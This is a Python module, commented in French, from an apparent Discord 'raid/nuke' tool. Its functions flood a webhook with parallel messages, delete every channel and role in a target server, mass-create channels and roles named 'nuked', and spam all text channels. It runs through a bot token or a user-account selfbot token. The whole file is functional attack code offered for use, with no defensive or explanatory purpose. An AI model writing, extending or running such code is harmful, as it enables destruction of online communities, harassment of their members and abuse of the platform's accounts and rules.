# -*- coding: utf-8 -*-
# ============================================================
# MODULE ACTIONS — Raid, Nuke, Spam
# Supporte : bot / selfbot / webhook uniquement
# ============================================================
import asyncio
import aiohttp
import discord
from colorama import Fore

# ============================================================
# WEBHOOK SPAM (fonctionne sans client Discord)
# ============================================================
async def webhook_spam(url: str, message: str, count: int):
    # Envoie N messages en parallèle
    async with aiohttp.ClientSession() as session:
        tasks = [
            session.post(url, json={"content": message, "tts": False})
            for _ in range(count)
        ]
        await asyncio.gather(*tasks, return_exceptions=True)
    print(Fore.GREEN + f"[+] {count} messages webhook envoyés")

# ============================================================
# ACTIONS DISCORD (bot ou selfbot)
# ============================================================
async def nuke_channels(guild):
    # Supprime tous les salons
    for ch in guild.channels:
        try:
            await ch.delete()
            print(Fore.RED + f"[-] Salon supprimé : {ch.name}")
        except Exception as e:
            print(Fore.YELLOW + f"[!] {ch.name}: {e}")

async def nuke_roles(guild):
    # Supprime tous les rôles supprimables
    for role in guild.roles:
        if role.is_default() or role.managed:
            continue
        try:
            await role.delete()
            print(Fore.RED + f"[-] Rôle supprimé : {role.name}")
        except Exception as e:
            print(Fore.YELLOW + f"[!] {role.name}: {e}")

async def create_spam_channels(guild, message: str, n: int = 10):
    # Crée N salons et spam le message
    for i in range(n):
        try:
            ch = await guild.create_text_channel(f"nuked-{i}")
            await ch.send(message)
            print(Fore.GREEN + f"[+] Salon créé : {ch.name}")
        except Exception as e:
            print(Fore.YELLOW + f"[!] {e}")

async def create_roles(guild, n: int = 20):
    # Crée N rôles aléatoires
    for i in range(n):
        try:
            await guild.create_role(name=f"nuked-{i}", colour=discord.Colour.random())
            print(Fore.GREEN + f"[+] Rôle créé : nuked-{i}")
        except Exception as e:
            print(Fore.YELLOW + f"[!] {e}")

async def channel_spam(guild, message: str, count: int = 5):
    # Spam tous les salons texte
    for ch in guild.text_channels:
        for _ in range(count):
            try:
                await ch.send(message)
            except Exception:
                pass
    print(Fore.GREEN + "[+] Spam salons terminé")

# ============================================================
# SÉQUENCES DE HAUT NIVEAU
# ============================================================
async def run_spam(cfg: dict):
    # Spam webhook + salons (si client dispo)
    if cfg.get("webhook"):
        await webhook_spam(cfg["webhook"], cfg["message"], cfg["spam_count"])
    if cfg.get("mode") in ("bot", "selfbot") and cfg.get("guild_id"):
        await _with_client(cfg, _do_channel_spam)

async def run_raid(cfg: dict):
    # Raid complet
    if cfg.get("webhook"):
        await webhook_spam(cfg["webhook"], cfg["message"], cfg["spam_count"])
    if cfg.get("mode") in ("bot", "selfbot") and cfg.get("guild_id"):
        await _with_client(cfg, _do_raid)

async def run_nuke(cfg: dict):
    # Nuke total
    if cfg.get("webhook"):
        await webhook_spam(cfg["webhook"], cfg["message"], cfg["spam_count"])
    if cfg.get("mode") in ("bot", "selfbot") and cfg.get("guild_id"):
        await _with_client(cfg, _do_nuke)

# ============================================================
# HELPERS INTERNES
# ============================================================
async def _do_channel_spam(guild, cfg):
    await channel_spam(guild, cfg["message"], 5)

async def _do_raid(guild, cfg):
    await nuke_channels(guild)
    await create_spam_channels(guild, cfg["message"], 10)
    await create_roles(guild, 20)
    await channel_spam(guild, cfg["message"], 5)

async def _do_nuke(guild, cfg):
    await nuke_channels(guild)
    await nuke_roles(guild)
    await create_spam_channels(guild, cfg["message"], 15)
    await create_roles(guild, 30)
    await channel_spam(guild, cfg["message"], 10)

# ============================================================
# LANCEMENT CLIENT DISCORD (bot ou selfbot)
# ============================================================
async def _with_client(cfg: dict, action):
    # Crée un client temporaire, exécute l'action, ferme
    intents = discord.Intents.all()
    selfbot = cfg["mode"] == "selfbot"

    # discord.py-self pour selfbot, discord.py pour bot
    if selfbot:
        import discord as d
        ClientClass = d.Client
    else:
        ClientClass = discord.Client

    client = ClientClass(intents=intents)

    @client.event
    async def on_ready():
        print(Fore.CYAN + f"[*] Connecté : {client.user}")
        guild = client.get_guild(cfg["guild_id"])
        if not guild:
            print(Fore.RED + "[X] Guild introuvable")
        else:
            await action(guild, cfg)
        await client.close()

    try:
        await client.start(cfg["token"])
    except Exception as e:
        print(Fore.RED + f"[X] Erreur client : {e}")
